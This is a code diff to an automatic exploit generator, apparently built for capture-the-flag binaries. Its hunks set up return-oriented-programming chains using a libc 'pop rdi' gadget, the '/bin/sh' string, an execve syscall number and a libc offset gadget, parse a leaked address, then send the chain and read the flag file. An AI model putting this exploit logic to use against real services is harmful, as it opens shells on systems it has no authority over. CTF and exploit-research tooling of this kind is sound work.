@@ -485,6 +485,8 @@ class rAEG:
                             #print(arg_regs[i])
                             param = parameters[i]
                             break;
+                        if b"rax" in instruction:
+                            param = p64(59)
                     chain += param
 
         # To avoid movaps error for all chains put an extra ret to make the chain divisible by 16
@@ -554,17 +556,21 @@ class rAEG:
 
         pop_rdi = p64(r.find_gadget(["pop rdi", "ret"])[0] + self.libc.address)
         bin_sh = p64(next(self.libc.search(b"/bin/sh\x00")))
-        logger.info(f"Found pop rdi gadget in libc {hex(u64(pop_rdi))}")
-        logger.info(f"Found /bin/sh address in libc {hex(u64(bin_sh))}")
+        #logger.info(f"Found pop rdi gadget in libc {hex(u64(pop_rdi))}")
+        #logger.info(f"Found /bin/sh address in libc {hex(u64(bin_sh))}")
 
 
-        #padding_len = 248
+        self.padding = 248
         #padding_len = 152
-        padding_len = 88
+        #padding_len = 88
         #padding_len = 216
 
-        #chain = self.symbolic_padding
-        chain = b"A" * padding_len
+        if self.symbolic_padding == None:
+            if self.padding != None:
+               chain = b"A" * self.padding
+        else:
+            chain = self.symbolic_padding
+
         chain += p64(self.libc.address + 0x4f302)
         chain += p64(0) * 100
 
@@ -794,7 +800,7 @@ class rAEG:
 
         debug_ouput = debug_output.split("Leak")
 
-        leak_address = re.findall(r"0x7f[A-Fa-f0-9]+", debug_output)
+        leak_address = re.findall(r" 0x7f[A-Fa-f0-9]+", debug_output)
         #print("\n\n")
         #print(f"Leak: {leak_address}")
         leak_address = leak_address[-1]
@@ -830,11 +836,11 @@ class rAEG:
             if self.rop_chain != None:
                 logger.info("Sending ROP Chain")
                 p.sendline(self.symbolic_padding + self.rop_chain)
-                p.sendline(b"whoami")
+                p.sendline(b"cat flag.txt")
                 p.sendline(b"cat flag.txt")
                 try:
-                    output = p.recvuntil(b"}").decode().split("\n")[-1]
-                    self.flag = output
+                    output = p.recvall(timeout=5).decode()
+                    self.flag = "flag{" + output.split("{")[1].split("}")[0] + "}"
                     print(self.flag)
                 except:
                     logger.info("ROP chain exploit failed")
